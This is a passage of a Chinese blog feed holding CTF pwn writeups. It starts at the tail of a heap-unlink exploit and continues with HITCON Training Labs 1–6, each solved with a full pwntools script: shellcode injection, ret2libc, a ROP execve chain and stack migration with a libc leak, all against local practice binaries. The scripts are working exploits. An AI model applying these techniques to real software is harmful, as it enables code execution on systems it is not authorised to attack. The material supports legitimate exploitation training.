punctuation">)</span>note_list <span class="token operator">=</span> <span class="token number">0x411830</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>note_list<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>note_list<span class="token number">-0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x411830</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"info: "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x411830</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> double free </tag>
            
            <tag> 非栈上的格式化字符串 </tag>
            
            <tag> mips </tag>
            
            <tag> 劫持栈 </tag>
            
            <tag> 模拟http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon Training系列学习记录</title>
      <link href="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/"/>
      <url>/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未入门时做hitcon-training系列收获很大，怀着一颗感恩的心来整理writeup</p><h1 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/0.png"></div><p>直接上脚本吧</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/1.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/2.png"></div><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/3.png"></div><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timep <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x0804a060</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Name:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">32</span><span class="token operator">*</span><span class="token string">'a'</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"best:"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/4.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/5.png"></div>任意地址读取，读取got的地址<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/6.png"></div>溢出<p>打印got表地址，算出offset得到system地址，构造简单的ret2lib的rop</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"(in dec) :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> printf_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> offsetpayload  <span class="token operator">=</span> <span class="token number">60</span><span class="token operator">*</span><span class="token string">"a"</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"me :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/7.png"></div><p>注意int 80系统调用的使用，是eax寄存器。具体的查阅资料即可。注意execve函数的参数，read。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux','split','-h']</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./simplerop"</span><span class="token punctuation">)</span>int_80 <span class="token operator">=</span> <span class="token number">0x080493e1</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bae06</span>pop_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806e851</span>pop_edx <span class="token operator">=</span> <span class="token number">0x0806e82a</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x80ea060</span>start_addr <span class="token operator">=</span> <span class="token number">0x8048d0a</span>mov_buf_edx <span class="token operator">=</span> <span class="token number">0x0807b301</span> <span class="token comment" spellcheck="true"># mov dword ptr [eax], edx ; ret</span>pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806e850</span> <span class="token comment" spellcheck="true"># : pop edx ; pop ecx ; pop ebx ; ret</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">32</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"/bin"</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_buf_edx<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"/sh\x00"</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_buf_edx<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/8.png"></div><p>栈上数据不可执行，同时不能修改GOT表。没有开启地址随机化</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/9.png"></div>明显的栈溢出，读取64个字节，但是只有40个字节的栈空间 。<p>开启RELRO，我们需要leak got表，来获得libc的基址，从而得到system函数的地址。</p><p>但是可用空间非常小，所以我们需要进行劫持栈指针。（原理：leave = mov esp，ebp； pop ebp）</p><p>步骤一：（迁移栈，调用read获得下一部分payload）</p><p>第一个rop = 40*‘a’+ 想要劫持的栈地址 + read_plt + leave + 参数1 + 想要劫持的栈地址 + 参数2</p><p>注意，我们需要将地址放在data段：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/10.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/11.png"></div><p>经过运行和后可以看看那些地方空的：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/12.png"></div>即0x804a400开始，前面0x200都是空的，所以第一个迁移地址为0x804a200,第二个迁移地址是0x804a300<p>查看rop链</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/13.png"></div>核心指令：readelf、rop、vmmap<p>步骤二：（leak函数地址，迁移到第二个栈，获取第三段payload）</p><p>第二个rop链：</p><p>rop = 第二个想要迁移的指令（pop ebp）+ puts_plt + pop_ret （关键点1）+ puts_got（关键点2） + read_plt + leave_ret + 三个参数</p><p>关键点一：之前的疑问：在这里pop里还怎么泄露后面的puts_got？回答：是当整个puts函数执行了输出 了后面put_got参数之后才返回接下来的汇编指令pop，这跟前面的level0异曲同工。pop之后才可以继续顺利的进行rop，同样的如果这里是read函数，后面有三个参数，那么如果后面还要继续rop就要继续pop三个参数再ret才能继续。</p><p>关键点二：为什么不能用read_got只能用puts_got？</p><p>关键点三：获得的puts_got当前地址-puts_off = libc_base;  system_addr = libc_base+system_off</p><p>核心指令：off [func]</p><p>步骤三：（get shell）</p><p>rop =  随便一个地址（pop ebp）  + system_addr + any_addr + 参数地址(关键点) + “/bin/sh”</p><p>关键点部分注意地址是迁移过来的地址+4*4（别忘记了）</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">#context.log_level = 'DEBUG'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>buf1 <span class="token operator">=</span> <span class="token number">0x804a200</span><span class="token operator">+</span><span class="token number">0x100</span>buf <span class="token operator">=</span> <span class="token number">0x804a200</span>leave_addr <span class="token operator">=</span> <span class="token number">0x08048503</span>pop_ret <span class="token operator">=</span> <span class="token number">0x0804836d</span>read_plt <span class="token operator">=</span> <span class="token number">0x08048380</span>puts_plt <span class="token operator">=</span> <span class="token number">0x08048390</span>system_off <span class="token operator">=</span> <span class="token number">0x3ada0</span>puts_off <span class="token operator">=</span> <span class="token number">0x5fca0</span>puts_got <span class="token operator">=</span> <span class="token number">0x08049ff0</span>read_got <span class="token operator">=</span> <span class="token number">0x08049fe8</span>rop1 <span class="token operator">=</span> <span class="token number">40</span><span class="token operator">*</span><span class="token string">'a'</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 劫持栈指针</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回地址是read函数</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 返回地址是劫持栈指针的汇编指令</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 第一个参数0</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 地址</span>rop1<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 长度</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":\n"</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 由于一共接收64个字符，这里已经有40+4*6，所以不能再“/n”了</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 停止一下</span>rop2<span class="token operator">=</span><span class="token string">""</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 接下来需要劫持栈顶指针的地址</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ret<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 这个还会详细说明,清空下面的参数，继续rop</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 打印出put_got在内存中的地址,这里还有个问题为什么read_got不行？</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 调用read继续读</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 继续劫持栈指针</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span>rop2<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span>data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> puts_off<span class="token keyword">print</span> <span class="token string">"libc_base: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> system_offtime<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>rop3<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>buf<span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf1<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 